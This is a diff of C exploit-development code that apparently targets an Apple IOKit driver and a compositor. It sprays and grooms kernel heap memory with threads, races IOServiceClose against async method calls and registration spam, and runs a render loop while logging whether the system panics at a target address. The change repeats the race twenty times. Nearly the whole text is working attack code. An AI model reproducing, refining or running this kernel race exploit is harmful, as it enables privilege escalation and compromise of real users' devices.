@@ -24260,70 +24260,71 @@ new_modes:
                 p16_groom_wps = r201_gwps;
                 p16_groom_n = r201_gn;
                 p16_groom_data = r201_pdata;
-                p16_groom_count = 0;
-                p16_groom_run = 1;
-                pthread_t r201_gths[4];
-                for (int t = 0; t < 4; t++)
-                    pthread_create(&r201_gths[t], NULL, p16_groom_spray, NULL);
-                usleep(1000);
 
-                uint64_t r201_inp[3] = {1, 2, 3};
-                io_connect_t r201_pcs[8]; int r201_phave[8];
-                for (int i = 0; i < 8; i++) {
-                    r201_phave[i] = (IOServiceOpen(r201_svc, mach_task_self(), 0,
-                        &r201_pcs[i]) == KERN_SUCCESS);
-                    if (r201_phave[i]) {
-                        mach_port_t tw = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
-                        mach_port_insert_right(mach_task_self(), tw, tw,
-                            MACH_MSG_TYPE_MAKE_SEND);
-                        uint64_t ref = 0xFF;
-                        IOConnectCallAsyncMethod(r201_pcs[i], 17, tw, &ref, 1,
-                            NULL, 0, r201_inp, 24, NULL, NULL, NULL, NULL);
-                        mach_port_deallocate(mach_task_self(), tw);
-                    } else r201_pcs[i] = IO_OBJECT_NULL;
+                #define R201_ITERS 20
+                rlog("  Running %d race+groom+render iterations\n", R201_ITERS);
+
+                for (int r201_iter = 0; r201_iter < R201_ITERS; r201_iter++) {
+                    p16_groom_count = 0;
+                    p16_groom_run = 1;
+                    pthread_t r201_gths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r201_gths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000);
+
+                    uint64_t r201_inp[3] = {1, 2, 3};
+                    io_connect_t r201_pcs[8]; int r201_phave[8];
+                    for (int i = 0; i < 8; i++) {
+                        r201_phave[i] = (IOServiceOpen(r201_svc, mach_task_self(), 0,
+                            &r201_pcs[i]) == KERN_SUCCESS);
+                        if (r201_phave[i]) {
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xFF;
+                            IOConnectCallAsyncMethod(r201_pcs[i], 17, tw, &ref, 1,
+                                NULL, 0, r201_inp, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        } else r201_pcs[i] = IO_OBJECT_NULL;
+                    }
+
+                    p13_spam_run = 1;
+                    p13_spam_conn = r201_phave[0] ? r201_pcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r201_spam[16];
+                    for (int t = 0; t < 16; t++)
+                        pthread_create(&r201_spam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (r201_phave[i]) { IOServiceClose(r201_pcs[i]); r201_phave[i] = 0; }
+                        usleep(100);
+                    }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 16; t++) pthread_join(r201_spam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (r201_phave[i]) IOServiceClose(r201_pcs[i]);
+                    usleep(2000);
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(r201_gths[t], NULL);
+
+                    rlog("  [%d] spam=%llu groom=%llu\n", r201_iter,
+                         (unsigned long long)p13_spam_count,
+                         (unsigned long long)p16_groom_count);
+
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r201_pr;
+                    pthread_create(&r201_pr, NULL, p13_render_loop, NULL);
+                    usleep(500000);
+                    p13_render_run = 0;
+                    pthread_join(r201_pr, NULL);
+                    rlog("  [%d] render frames=%d\n", r201_iter, p13_render_frames);
+                    rlog("  [%d] survived\n", r201_iter);
                 }
 
-                p13_spam_run = 1;
-                p13_spam_conn = r201_phave[0] ? r201_pcs[0] : IO_OBJECT_NULL;
-                p13_spam_shape = 1;
-                p13_spam_count = 0;
-                pthread_t r201_spam[16];
-                for (int t = 0; t < 16; t++)
-                    pthread_create(&r201_spam[t], NULL, p13_spam_reg, NULL);
-
-                for (int i = 7; i >= 0; i--) {
-                    if (r201_phave[i]) { IOServiceClose(r201_pcs[i]); r201_phave[i] = 0; }
-                    usleep(100);
-                }
-                p13_spam_run = 0;
-                for (int t = 0; t < 16; t++) pthread_join(r201_spam[t], NULL);
-                for (int i = 0; i < 8; i++) if (r201_phave[i]) IOServiceClose(r201_pcs[i]);
-                usleep(2000);
-                p16_groom_run = 0;
-                for (int t = 0; t < 4; t++) pthread_join(r201_gths[t], NULL);
-
-                rlog("  Groom count=%llu\n", (unsigned long long)p16_groom_count);
-
-                rlog("\n  ** Triggering compositor walk — expect CRASH **\n");
-                rlog("  ** Panic FAR should contain the VALUE at 0x%016llx **\n",
-                     (unsigned long long)r201_target);
-
-                p13_render_run = 1;
-                p13_render_frames = 0;
-                pthread_t r201_pr;
-                pthread_create(&r201_pr, NULL, p13_render_loop, NULL);
-
-                for (int s = 0; s < 10; s++) {
-                    usleep(1000000);
-                    rlog("  +%ds alive, frames=%d\n", s + 1, p13_render_frames);
-                }
-
-                p13_render_run = 0;
-                pthread_join(r201_pr, NULL);
-
-                rlog("\n  ** SURVIVED 10s — value at target addr is 0 or valid chain **\n");
-                rlog("  ** VALUE AT 0x%016llx = 0x0 (or valid pointer to zeros) **\n",
+                rlog("\n  ** All %d iterations survived **\n", R201_ITERS);
+                rlog("  ** VALUE AT 0x%016llx = 0x0 (zero/valid chain) **\n",
                      (unsigned long long)r201_target);
 
                 for (int g = 0; g < r201_gn; g++) {
